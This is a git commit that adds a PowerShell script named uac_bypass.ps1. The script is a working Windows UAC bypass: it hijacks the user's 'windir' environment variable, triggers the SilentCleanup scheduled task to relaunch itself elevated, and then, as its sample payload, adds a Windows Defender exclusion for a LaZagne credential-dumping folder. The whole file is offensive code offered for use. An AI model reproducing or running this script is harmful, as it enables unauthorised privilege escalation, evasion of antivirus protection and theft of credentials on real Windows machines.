e940a818f1a778727d78b83fe220df0220b851a8
Carter Brainerd <cbawsome77@gmail.com>
2019-06-19 22:32:11 -0400

    Add files via upload

---
+++ uac_bypass.ps1
@@ -0,0 +1,16 @@
+if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
+    #Payload goes here
+    #It'll run as Administrator
+    Add-MpPreference -ExclusionPath "C:\Users\Carter\Desktop\LaZagne"
+} else {
+    $registryPath = "HKCU:\Environment"
+    $Name = "windir"
+    #Use for hidden window
+    #$Value = "powershell -ExecutionPolicy bypass -windowstyle hidden -Command `"& `'$PSCommandPath`'`";#"
+    #Use for interactive window
+    $Value = "powershell -ExecutionPolicy bypass -Command `"& `'$PSCommandPath`'`";#"
+    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
+    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
+    Remove-ItemProperty -Path $registryPath -Name $name
+}
